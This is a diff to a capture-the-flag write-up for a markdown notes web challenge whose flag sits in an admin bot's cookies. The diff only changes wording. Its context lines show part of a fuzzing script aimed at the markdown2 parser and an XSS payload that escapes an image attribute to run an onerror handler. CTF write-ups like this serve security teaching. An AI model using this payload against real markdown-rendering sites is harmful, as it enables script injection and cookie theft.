@@ -4,7 +4,7 @@
 Yes, another markdown editor, but this time we keep it simple!
 Site: [http://simplemdserver.challs.open.ecsc2024.it:47008](http://simplemdserver.challs.open.ecsc2024.it:47008)
 ## Overview
-Classic notes app, supports markdown.
+Classic notes app, supports **markdown**.
 ## Road to flag
 The flag is inside admin bot's cookies:
 ```js
@@ -32,7 +32,7 @@ r = requests.post(
 ```
 -> XSS
 
-## Exploit
+## Exploit (unintended solution)
 I just fuzzed the markdown parser:
 ```python
 import markdown2
@@ -87,7 +87,7 @@ def start_fuzzing():
 if __name__ == "__main__":
     start_fuzzing()
 ```
-And came up with:
+And came up with a payload that triggers xss:
 ```
 ![](`" onerror=alert()//`)
 ```
